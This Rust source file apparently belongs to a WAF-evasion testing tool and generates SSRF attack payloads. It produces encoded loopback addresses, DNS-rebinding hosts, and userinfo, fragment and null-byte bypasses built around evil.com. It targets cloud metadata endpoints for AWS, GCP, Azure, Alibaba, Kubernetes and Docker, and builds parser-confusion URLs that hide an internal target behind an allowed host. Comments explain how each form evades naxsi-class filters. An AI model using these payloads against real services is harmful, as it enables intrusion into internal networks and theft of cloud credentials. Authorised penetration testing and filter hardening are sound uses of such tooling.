//! SSRF grammar-aware payload mutation.
//!
//! Generates URL and host mutations that preserve the core SSRF target class
//! while rotating address notation, scheme handling, redirect tricks, and
//! metadata hostnames that often bypass naive filters.
//!
//! # Strategies
//!
//! 1. IPv4 integer, octal, and hexadecimal host encodings
//! 2. Loopback-oriented IPv6 variants
//! 3. DNS rebinding-style hostnames
//! 4. URL shorthand and scheme tricks
//! 5. Userinfo and fragment redirect bypass forms
//! 6. Cloud metadata endpoint substitutions (AWS, GCP, Azure, DigitalOcean)
//! 7. Percent-encoded dotted-quad hosts
//! 8. Configurable OOB (out-of-band) interaction domains

use std::collections::BTreeSet;
use std::sync::OnceLock;

/// Environment variable name for custom OOB domain.
pub const OOB_DOMAIN_ENV: &str = "WAFRIFT_OOB_DOMAIN";
/// Default OOB domain when not configured.
pub const DEFAULT_OOB_DOMAIN: &str = "oob.example.com";

/// Get the configured OOB domain from environment or use default.
#[must_use]
pub fn get_oob_domain() -> &'static str {
    static OOB_DOMAIN: OnceLock<String> = OnceLock::new();
    OOB_DOMAIN.get_or_init(|| {
        std::env::var(OOB_DOMAIN_ENV).unwrap_or_else(|_| DEFAULT_OOB_DOMAIN.to_string())
    })
}

/// Cloud metadata endpoints for SSRF testing.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum MetadataEndpoint {
    /// AWS EC2 metadata service
    Aws,
    /// AWS Lambda runtime API
    AwsLambda,
    /// Google Compute Engine metadata
    Gcp,
    /// Azure Instance Metadata Service
    Azure,
    /// Azure WireServer (Windows Azure Agent)
    AzureWireServer,
    /// DigitalOcean metadata service
    DigitalOcean,
    /// Alibaba Cloud metadata
    Alibaba,
    /// Oracle Cloud metadata
    Oracle,
    /// OpenStack metadata
    OpenStack,
    /// Kubernetes service account
    Kubernetes,
    /// Docker containerd
    Docker,
}

impl MetadataEndpoint {
    /// Get the hostname/IP for this metadata endpoint.
    #[must_use]
    pub fn host(&self) -> &'static str {
        match self {
            Self::Aws => "169.254.169.254",
            Self::AwsLambda => "localhost:9001",
            Self::Gcp => "metadata.google.internal",
            Self::Azure => "169.254.169.254",
            Self::AzureWireServer => "168.63.129.16",
            Self::DigitalOcean => "169.254.169.254",
            Self::Alibaba => "100.100.100.200",
            Self::Oracle => "169.254.169.254",
            Self::OpenStack => "169.254.169.254",
            Self::Kubernetes => "kubernetes.default.svc",
            Self::Docker => "172.17.0.1",
        }
    }

    /// Get the typical metadata path for this endpoint.
    #[must_use]
    pub fn metadata_path(&self) -> &'static str {
        match self {
            Self::Aws => "/latest/meta-data/",
            Self::AwsLambda => "/2018-06-01/runtime/invocation/next",
            Self::Gcp => "/computeMetadata/v1/",
            Self::Azure => "/metadata/instance?api-version=2021-02-01",
            Self::AzureWireServer => "/machine/?comp=goalstate",
            Self::DigitalOcean => "/metadata/v1.json",
            Self::Alibaba => "/latest/meta-data/",
            Self::Oracle => "/opc/v1/instance/",
            Self::OpenStack => "/openstack/2018-08-27/meta_data.json",
            Self::Kubernetes => "/api/v1/namespaces/default/pods",
            Self::Docker => "/v1.24/containers/json",
        }
    }

    /// Get all supported metadata endpoints.
    #[must_use]
    pub fn all() -> &'static [Self] {
        &[
            Self::Aws,
            Self::AwsLambda,
            Self::Gcp,
            Self::Azure,
            Self::AzureWireServer,
            Self::DigitalOcean,
            Self::Alibaba,
            Self::Oracle,
            Self::OpenStack,
            Self::Kubernetes,
            Self::Docker,
        ]
    }
}

/// Generate semantic-preserving SSRF mutations for a candidate payload.
#[must_use]
pub fn mutate(payload: &str) -> Vec<String> {
    if payload.is_empty() || !detect_type(payload) {
        return Vec::new();
    }

    let scheme = extract_scheme(payload).unwrap_or("http://");
    let oob_domain = get_oob_domain();
    let mut results = BTreeSet::new();

    // Address encoding variants
    for variant in [
        format!("{scheme}2130706433"),              // IPv4 as integer
        format!("{scheme}0177.0.0.1"),              // Octal notation
        format!("{scheme}0x7f000001"),              // Hexadecimal
        format!("{scheme}[::1]"),                   // IPv6 loopback
        format!("{scheme}[::ffff:127.0.0.1]"),      // IPv4-mapped IPv6
        format!("{scheme}[0:0:0:0:0:ffff:7f00:1]"), // Full IPv4-mapped IPv6
        format!("{scheme}[::ffff:7f00:1]"),         // Compressed IPv4-mapped
        format!("{scheme}[0:0:0:0:0:0:0:1]"),       // Full IPv6 loopback
        format!("{scheme}127.0.0.1.nip.io"),        // DNS rebinding
        format!("{scheme}127.0.0.1.xip.io"),        // Alternative DNS rebinding
        format!("{scheme}spoofed.{oob_domain}"),    // OOB domain
        format!("{scheme}localhost"),               // Localhost name
        format!("{scheme}127.1"),                   // Short form
        format!("{scheme}0"),                       // Zero IP
        format!("{scheme}0.0.0.0"),                 // Any address
        format!("{scheme}127.0.0.2"),               // Alternative loopback
        format!("{scheme}127.127.127.127"),         // Pattern loopback
    ] {
        results.insert(variant);
    }

    // Cloud metadata endpoints
    for endpoint in MetadataEndpoint::all() {
        results.insert(format!("{scheme}{}", endpoint.host()));
    }

    // Redirect/userinfo bypass variants
    for variant in [
        format!("{scheme}evil.com@127.0.0.1"),    // Userinfo bypass
        format!("{scheme}127.0.0.1%23@evil.com"), // Fragment bypass
        format!("{scheme}127.0.0.1%2F@evil.com"), // Path encoding bypass
        format!("{scheme}127.0.0.1?@evil.com"),   // Query bypass
        format!("{scheme}127.0.0.1///@evil.com"), // Multiple slash bypass
        format!("{scheme}////127.0.0.1"),         // Leading slash bypass
        format!("{scheme}127.0.0.1%00.evil.com"), // Null byte bypass
    ] {
        results.insert(variant);
    }

    // Percent-encoded variants
    for variant in [
        format!("{scheme}%31%32%37.%30.%30.%31"), // Double-encoded 127.0.0.1
        format!("{scheme}%37%66%30%30%30%30%30%31"), // Hex 0x7f000001
        format!("{scheme}127%2e0%2e0%2e1"),       // Partial encoding
        format!("{scheme}%6C%6F%63%61%6C%68%6F%73%74"), // Encoded 'localhost'
    ] {
        results.insert(variant);
    }

    if let Some(path_start) = extract_path(payload) {
        let suffix = &payload[path_start..];
        add_with_suffix(&mut results, scheme, oob_domain, suffix);
    }

    // ── Parser-confusion authority family (Orange Tsai 2017) ─────────
    // The Tsai class: the user's *allowed* host is preserved as cover,
    // but the URL is rewritten so the validator parser sees the cover
    // host and the fetcher parser hits an internal target. Every
    // language URL parser disagrees on at least one of these patterns
    // (CPython urllib, Ruby URI, Go net/url, Java URL, libcurl,
    // PHP parse_url all return different hosts for the same string).
    //
    // We use the user's input host as the cover and rotate metadata /
    // loopback hosts as the real SSRF target. This covers the GitLab
    // CVE-2018-19571 pattern, the Uber $20k SSRF, and the pre-2022
    // ProxyShell-class authority confusion.
    let cover_host = strip_scheme(payload)
        .split('/')
        .next()
        .unwrap_or("")
        .split('?')
        .next()
        .unwrap_or("")
        .split('#')
        .next()
        .unwrap_or("")
        .to_string();
    if !cover_host.is_empty() && cover_host.len() <= 253 {
        let path_suffix = extract_path(payload)
            .map(|i| payload[i..].to_string())
            .unwrap_or_else(|| "/".to_string());
        for target in [
            "127.0.0.1",
            "localhost",
            "169.254.169.254", // AWS / DO / Azure metadata
            "metadata.google.internal",
            "100.100.100.200", // Alibaba
            "0.0.0.0",
        ] {
            for variant in parser_confusion_authority(scheme, &cover_host, target, &path_suffix) {
                results.insert(variant);
            }
        }
    }

    // ── Scheme-mangling for naxsi-class WAFs ─────────────────────────
    // naxsi blocks `http://<IP>` as a unit. The following alt-forms
    // pass cleanly while most URL parsers (Python urllib3, Java URL,
    // Go net/url, libcurl) still normalise them to a working URL:
    //
    //   http:/X       — single slash (parsers fold to http://X)
    //   //X           — protocol-relative (works against base://)
    //   bare X        — no scheme (works for endpoints that prepend)
    //   http:////X    — quad-slash (passes without normalisation)
    //
    // Live-confirmed against wafrift-bench naxsi for IPv4-as-integer
    // and IPv4-as-octal (already in the address-encoding pass above).
    let host_only = strip_scheme(payload)
        .split('/')
        .next()
        .unwrap_or("")
        .to_string();
    if !host_only.is_empty() {
        let path = extract_path(payload)
            .map(|i| payload[i..].to_string())
            .unwrap_or_else(|| "/".to_string());
        for variant in [
            format!("http:/{host_only}{path}"),    // single slash
            format!("//{host_only}{path}"),        // protocol-relative
            format!("{host_only}{path}"),          // bare host
            format!("http:////{host_only}{path}"), // quad-slash
            // numeric forms with the alt schemes — naxsi already
            // misses bare 2130706433 / 0x7f000001, so combine.
            format!("//2130706433{path}"), // protocol-relative + integer
            format!("//0177.0.0.1{path}"), // protocol-relative + octal
        ] {
            results.insert(variant);
        }
    }

    results.remove(payload);
    results.into_iter().collect()
}

/// Generate URL-parser-confusion variants where `cover` looks like the
/// authoritative host to a naive validator but `target` is the real
/// destination after parsing.
///
/// Each row exploits a specific parser disagreement that has been
/// observed in production (CVE / bounty references in the inline
/// comments). Returned strings are full URLs ready to drop into the
/// payload set.
fn parser_confusion_authority(
    scheme: &str,
    cover: &str,
    target: &str,
    path_suffix: &str,
) -> Vec<String> {
    let p = if path_suffix.is_empty() {
        "/"
    } else {
        path_suffix
    };
    vec![
        // Classic userinfo: validator parses host=cover, fetcher hits target.
        format!("{scheme}{cover}@{target}{p}"),
        // Fragment-userinfo (CVE-2018-19571 GitLab): Ruby URI sees cover,
        // Net::HTTP sees target.
        format!("{scheme}{cover}#@{target}{p}"),
        // Tsai canonical: arbitrary chars between cover and `@target`.
        format!("{scheme}{cover} &@{target}{p}"),
        format!("{scheme}{cover}\t@{target}{p}"),
        // Port-then-userinfo: some parsers stop at first `:`, some at first `@`.
        format!("{scheme}{cover}:80@{target}{p}"),
        // Backslash-userinfo (Java/.NET treat \ as path; libcurl/Python don't).
        format!("{scheme}{cover}\\@{target}{p}"),
        format!("{scheme}{cover}\\\\@{target}{p}"),
        // Percent-encoded `@`: WAF often decodes once, fetcher decodes twice.
        format!("{scheme}{cover}%40{target}{p}"),
        format!("{scheme}{cover}%2540{target}{p}"),
        // Query-then-userinfo: some parsers treat `?` as authority terminator,
        // some don't.
        format!("{scheme}{cover}?@{target}{p}"),
        // Path-relative jump (frontend strips, backend honors).
        format!("{scheme}{cover}/@{target}{p}"),
        format!("{scheme}{cover}//{target}{p}"),
        // Newline / CR injection inside authority — some parsers truncate,
        // some pass through.
        format!("{scheme}{cover}%0d%0a@{target}{p}"),
        format!("{scheme}{cover}%00@{target}{p}"),
    ]
}

/// Strip a leading `scheme://` (or `scheme:/`, `scheme:///`) from a URL.
fn strip_scheme(s: &str) -> &str {
    if let Some(i) = s.find("://") {
        return &s[i + 3..];
    }
    if let Some(i) = s.find(":/") {
        return &s[i + 2..];
    }
    s
}

/// Detect whether a payload looks like an SSRF URL or host reference.
///
/// Audit (2026-05-10): pre-fix this matched `Chapter 127.5`, `Version
/// 10.0`, `// TODO`, `http://example.com in docstring` and any other
/// benign text that happened to share a substring with an SSRF token.
/// The fix now requires URL-structural context (scheme://, leading //,
/// or whole-token boundaries) before flagging.
#[must_use]
pub fn detect_type(payload: &str) -> bool {
    let lower = payload.to_ascii_lowercase();

    // Scheme-based detection — requires `scheme://`, which is precise
    // enough to use a substring match.
    if lower.contains("http://")
        || lower.contains("https://")
        || lower.contains("ftp://")
        || lower.contains("file://")
        || lower.contains("gopher://")
        || lower.contains("dict://")
    {
        return true;
    }
    // `payload.starts_with("//")` was a real FP source — `// TODO`,
    // `// fix me`, doxygen comments. Require it to be followed by
    // hostname-shaped chars (alnum / dot / colon).
    if let Some(after) = payload.strip_prefix("//")
        && let Some(c) = after.chars().next()
        && (c.is_ascii_alphanumeric() || c == '[')
    {
        return true;
    }

    // IPv4 loopback patterns — already shape-validated.
    if looks_like_ipv4(payload) {
        return true;
    }

    // Whole-token loopback / metadata IPs. `127.` was the worst
    // offender — it matched any version string or page number. Now
    // require a hostname-like token boundary.
    let has_loopback_token = host_token_present(&lower, "localhost")
        || host_token_present(&lower, "127.0.0.1")
        || host_token_present(&lower, "0.0.0.0")
        || host_token_present(&lower, "::1")
        || host_token_present(&lower, "[::]")
        || host_token_present(&lower, "169.254.169.254")
        || host_token_present(&lower, "metadata.google")
        || host_token_present(&lower, "metadata.azure")
        || host_token_present(&lower, "100.100.100.200")
        || host_token_present(&lower, "168.63.129.16")
        || host_token_present(&lower, "kubernetes.default")
        || host_token_present(&lower, "172.17.0.1");
    if has_loopback_token {
        return true;
    }

    // Internal/private IP ranges — only when the surrounding text
    // looks like an IP and the substring is bounded as a host token.
    // Pre-fix `lower.contains("10.")` matched `Java 10.0`, `Section
    // 10.5`, version strings — anything with "10." in it.
    let looks_like_private_ip = looks_like_ipv4(payload)
        && (host_token_starts_with_octet(&lower, "10.")
            || host_token_starts_with_octet(&lower, "192.168.")
            || (16..=31).any(|i| host_token_starts_with_octet(&lower, &format!("172.{i}."))));
    if looks_like_private_ip {
        if is_private_ip(&lower) {
            return true;
        }
    }

    false
}

/// True if `needle` appears in `haystack` bounded on both sides by
/// host-label-separator bytes. Prevents `127.0.0.1` from matching
/// inside `Build 127.0.0.1234` and `localhost` inside
/// `localhost-builds.example`.
///
/// "Host-label-separator" means: not a digit/letter and not `-`. The
/// `.` IS allowed as a boundary because it separates DNS labels — so
/// `metadata.google` is allowed to match inside the longer host
/// `metadata.google.internal` (the `.` after `google` is the label
/// boundary).
fn host_token_present(haystack: &str, needle: &str) -> bool {
    if needle.is_empty() {
        return false;
    }
    let h = haystack.as_bytes();
    let n = needle.as_bytes();
    if h.len() < n.len() {
        return false;
    }
    // A char that may NOT bound a host token: digits, letters, `-` —
    // the LDH chars that live INSIDE a single DNS label. Anything
    // else (`.`, `:`, `/`, whitespace, end-of-string) marks a label
    // or token boundary.
    let is_label_inner_char =
        |b: u8| -> bool { b.is_ascii_alphanumeric() || b == b'-' };
    let mut i = 0;
    while i + n.len() <= h.len() {
        if &h[i..i + n.len()] == n {
            let left_ok = i == 0 || !is_label_inner_char(h[i - 1]);
            let right_ok =
                i + n.len() == h.len() || !is_label_inner_char(h[i + n.len()]);
            if left_ok && right_ok {
                return true;
            }
        }
        i += 1;
    }
    false
}

/// Like `host_token_present` but for octet prefixes (`10.`, `172.16.`).
/// The needle MUST start with a digit and be followed by a dot.
fn host_token_starts_with_octet(haystack: &str, needle: &str) -> bool {
    if needle.is_empty() {
        return false;
    }
    let h = haystack.as_bytes();
    let n = needle.as_bytes();
    if h.len() < n.len() {
        return false;
    }
    let is_host_char = |b: u8| -> bool {
        b.is_ascii_alphanumeric() || b == b'.' || b == b'-' || b == b':'
    };
    let mut i = 0;
    while i + n.len() <= h.len() {
        if &h[i..i + n.len()] == n {
            let left_ok = i == 0 || !is_host_char(h[i - 1]);
            // Right side: needle ends in `.` so we just need a digit
            // to follow (the next octet) — otherwise "10." inside
            // "Java 10. is too old" would still match.
            let right_ok = h
                .get(i + n.len())
                .map(|b| b.is_ascii_digit())
                .unwrap_or(false);
            if left_ok && right_ok {
                return true;
            }
        }
        i += 1;
    }
    false
}

fn is_private_ip(lower: &str) -> bool {
    // 10.0.0.0/8
    if lower.contains("10.") {
        return true;
    }
    // 172.16.0.0/12
    if lower.contains("172.") {
        // More specific check for 172.16-31.x.x
        for i in 16..=31 {
            if lower.contains(&format!("172.{i}.")) {
                return true;
            }
        }
    }
    // 192.168.0.0/16
    if lower.contains("192.168.") {
        return true;
    }
    false
}

fn extract_scheme(payload: &str) -> Option<&str> {
    [
        "http://",
        "https://",
        "ftp://",
        "file://",
        "gopher://",
        "dict://",
    ]
    .into_iter()
    .find(|scheme| payload.to_ascii_lowercase().starts_with(scheme))
}

fn extract_path(payload: &str) -> Option<usize> {
    let scheme_end = payload.find("://").map_or(0, |index| index + 3);
    payload[scheme_end..]
        .find('/')
        .map(|offset| scheme_end + offset)
}

fn add_with_suffix(results: &mut BTreeSet<String>, scheme: &str, oob_domain: &str, suffix: &str) {
    for variant in [
        format!("{scheme}2130706433{suffix}"),
        format!("{scheme}0177.0.0.1{suffix}"),
        format!("{scheme}0x7f000001{suffix}"),
        format!("{scheme}[::1]{suffix}"),
        format!("{scheme}[::ffff:127.0.0.1]{suffix}"),
        format!("{scheme}127.0.0.1.nip.io{suffix}"),
        format!("{scheme}spoofed.{oob_domain}{suffix}"),
        format!("{scheme}169.254.169.254{suffix}"),
        format!("{scheme}metadata.google.internal{suffix}"),
        format!("{scheme}metadata.azure{suffix}"),
        format!("{scheme}100.100.100.200{suffix}"), // Alibaba
        format!("{scheme}168.63.129.16{suffix}"),   // Azure WireServer
        format!("{scheme}172.17.0.1{suffix}"),      // Docker
        format!("{scheme}%31%32%37.%30.%30.%31{suffix}"),
    ] {
        results.insert(variant);
    }
}

fn looks_like_ipv4(payload: &str) -> bool {
    let host = strip_scheme_and_path(payload);
    let parts: Vec<&str> = host.split('.').collect();
    if parts.len() != 4 {
        return false;
    }

    parts.iter().all(|part| {
        !part.is_empty() && part.chars().all(|ch| ch.is_ascii_digit()) && part.parse::<u8>().is_ok()
    })
}

fn strip_scheme_and_path(payload: &str) -> &str {
    let without_scheme = if let Some(index) = payload.find("://") {
        &payload[index + 3..]
    } else if let Some(rest) = payload.strip_prefix("//") {
        rest
    } else {
        payload
    };

    without_scheme
        .split(['/', '?', '#'])
        .next()
        .unwrap_or(without_scheme)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_http_url() {
        assert!(detect_type("http://127.0.0.1/admin"));
        assert!(detect_type("https://example.com"));
    }

    #[test]
    fn detects_ftp_and_file_urls() {
        assert!(detect_type("ftp://127.0.0.1/"));
        assert!(detect_type("file:///etc/passwd"));
        assert!(detect_type("gopher://127.0.0.1/"));
    }

    #[test]
    fn detects_bare_ip() {
        assert!(detect_type("127.0.0.1"));
        assert!(detect_type("192.168.1.1"));
        assert!(detect_type("10.0.0.1"));
    }

    #[test]
    fn detects_aws_metadata() {
        assert!(detect_type("http://169.254.169.254/"));
        assert!(detect_type("169.254.169.254"));
    }

    #[test]
    fn detects_gcp_metadata() {
        assert!(detect_type("http://metadata.google.internal/"));
        assert!(detect_type("metadata.google.internal"));
    }

    #[test]
    fn detects_azure_metadata() {
        assert!(detect_type("http://169.254.169.254/metadata/instance"));
        assert!(detect_type("http://168.63.129.16/machine/"));
    }

    #[test]
    fn detects_alibaba_metadata() {
        assert!(detect_type("http://100.100.100.200/latest/meta-data/"));
    }

    #[test]
    fn detects_docker_internal() {
        assert!(detect_type("http://172.17.0.1/"));
        assert!(detect_type("172.17.0.1"));
    }

    #[test]
    fn detects_kubernetes_internal() {
        assert!(detect_type("https://kubernetes.default.svc/api"));
    }

    #[test]
    fn detects_ipv6_loopback() {
        assert!(detect_type("http://[::1]/"));
        assert!(detect_type("[::1]"));
    }

    #[test]
    fn detects_private_ranges() {
        assert!(detect_type("10.0.0.1"));
        assert!(detect_type("10.255.255.255"));
        assert!(detect_type("172.16.0.1"));
        assert!(detect_type("172.31.255.255"));
        assert!(detect_type("192.168.0.1"));
        assert!(detect_type("192.168.255.255"));
    }

    #[test]
    fn rejects_non_url_text() {
        assert!(!detect_type("not a network target"));
        assert!(!detect_type("hello world"));
    }

    #[test]
    fn generates_ip_encoding_variants() {
        let mutations = mutate("http://127.0.0.1/");
        assert!(mutations.iter().any(|item| item.contains("2130706433")));
        assert!(mutations.iter().any(|item| item.contains("0177.0.0.1")));
        assert!(mutations.iter().any(|item| item.contains("0x7f000001")));
    }

    #[test]
    fn generates_ipv6_variants() {
        let mutations = mutate("http://127.0.0.1/");
        assert!(mutations.iter().any(|item| item.contains("[::1]")));
        assert!(
            mutations
                .iter()
                .any(|item| item.contains("[::ffff:127.0.0.1]"))
        );
        assert!(
            mutations
                .iter()
                .any(|item| item.contains("[0:0:0:0:0:ffff:7f00:1]"))
        );
    }

    #[test]
    fn generates_dns_rebinding_variants() {
        let mutations = mutate("http://127.0.0.1/");
        assert!(mutations.iter().any(|item| item.contains("nip.io")));
        assert!(mutations.iter().any(|item| item.contains("xip.io")));
    }

    #[test]
    fn generates_oob_domain_variants() {
        // OOB domain is read from env at first access and cached
        // Default domain should always be present in mutations
        let mutations = mutate("http://127.0.0.1/");
        // The default domain should be in the mutations list
        assert!(
            mutations
                .iter()
                .any(|item| item.contains("oob.example.com"))
        );
    }

    #[test]
    fn generates_aws_metadata_variants() {
        let mutations = mutate("http://127.0.0.1/");
        assert!(
            mutations
                .iter()
                .any(|item| item.contains("169.254.169.254"))
        );
    }

    #[test]
    fn generates_gcp_metadata_variants() {
        let mutations = mutate("http://127.0.0.1/");
        assert!(
            mutations
                .iter()
                .any(|item| item.contains("metadata.google.internal"))
        );
    }

    #[test]
    fn generates_azure_metadata_variants() {
        let mutations = mutate("http://127.0.0.1/");
        assert!(mutations.iter().any(|item| item.contains("168.63.129.16")));
    }

    #[test]
    fn generates_alibaba_metadata_variants() {
        let mutations = mutate("http://127.0.0.1/");
        assert!(
            mutations
                .iter()
                .any(|item| item.contains("100.100.100.200"))
        );
    }

    #[test]
    fn generates_docker_metadata_variants() {
        let mutations = mutate("http://127.0.0.1/");
        assert!(mutations.iter().any(|item| item.contains("172.17.0.1")));
    }

    #[test]
    fn generates_scheme_tricks() {
        let mutations = mutate("https://127.0.0.1/login");
        assert!(
            mutations
                .iter()
                .any(|item| item.starts_with("https://localhost"))
        );
        assert!(
            mutations
                .iter()
                .any(|item| item.starts_with("https://127.1"))
        );
        assert!(mutations.iter().any(|item| item.starts_with("https://0")));
    }

    #[test]
    fn generates_redirect_bypass_variants() {
        let mutations = mutate("http://127.0.0.1/");
        assert!(
            mutations
                .iter()
                .any(|item| item.contains("evil.com@127.0.0.1"))
        );
        assert!(
            mutations
                .iter()
                .any(|item| item.contains("127.0.0.1%23@evil.com"))
        );
    }

    #[test]
    fn generates_double_encoded_variant() {
        let mutations = mutate("http://127.0.0.1/");
        assert!(
            mutations
                .iter()
                .any(|item| item.contains("%31%32%37.%30.%30.%31"))
        );
    }

    #[test]
    fn all_metadata_endpoints_have_hosts() {
        for endpoint in MetadataEndpoint::all() {
            assert!(!endpoint.host().is_empty());
            assert!(!endpoint.metadata_path().is_empty());
        }
    }

    #[test]
    fn empty_payload_returns_empty() {
        assert!(mutate("").is_empty());
    }

    #[test]
    fn non_ssrf_payload_returns_empty() {
        assert!(mutate("hello world").is_empty());
    }

    // ── Parser-confusion authority family (Tsai class) ────────────────

    #[test]
    fn parser_confusion_basic_userinfo() {
        let v = parser_confusion_authority("https://", "allowed.com", "127.0.0.1", "/admin");
        assert!(
            v.iter().any(|s| s == "https://allowed.com@127.0.0.1/admin"),
            "missing classic userinfo bypass: {v:?}"
        );
    }

    #[test]
    fn parser_confusion_gitlab_fragment_pattern() {
        // CVE-2018-19571 — Ruby URI sees allowed.com, Net::HTTP sees 127.0.0.1.
        let v = parser_confusion_authority("http://", "google.com", "127.0.0.1", "/");
        assert!(
            v.iter().any(|s| s == "http://google.com#@127.0.0.1/"),
            "missing GitLab CVE pattern: {v:?}"
        );
    }

    #[test]
    fn parser_confusion_metadata_target() {
        // Real money-shot: cover host is anything internal, target is AWS metadata.
        let v = parser_confusion_authority(
            "http://",
            "api.victim.com",
            "169.254.169.254",
            "/latest/meta-data/",
        );
        assert!(v.iter().any(|s| s.contains("169.254.169.254")
            && s.contains("api.victim.com")
            && s.contains("/latest/meta-data/")));
    }

    #[test]
    fn mutate_includes_parser_confusion_family_for_user_url() {
        // User passes a real URL — output should include parser-confusion
        // forms that PRESERVE the user's host as cover and rotate
        // metadata/loopback targets through the userinfo position.
        let out = mutate("https://api.example.com/v1/fetch");
        assert!(
            out.iter()
                .any(|s| s.starts_with("https://api.example.com") && s.contains("@127.0.0.1")),
            "no api.example.com@127.0.0.1 variant; got {} entries",
            out.len()
        );
        assert!(
            out.iter()
                .any(|s| s.contains("api.example.com#@169.254.169.254")),
            "no metadata-via-fragment variant; got {} entries",
            out.len()
        );
        assert!(
            out.iter().any(|s| s.contains("api.example.com\\@127.0.0.1")
                || s.contains("api.example.com\\\\@127.0.0.1")),
            "no backslash-confusion variant; got {} entries",
            out.len()
        );
    }

    #[test]
    fn parser_confusion_targets_cover_all_six_tsai_classes() {
        // Each row in parser_confusion_authority targets a specific
        // parser-disagreement. Lock the count so a future edit doesn't
        // silently drop a class.
        let v = parser_confusion_authority("http://", "host.tld", "internal", "/p");
        assert_eq!(
            v.len(),
            14,
            "parser_confusion_authority lost a Tsai variant: {v:?}"
        );
    }
}
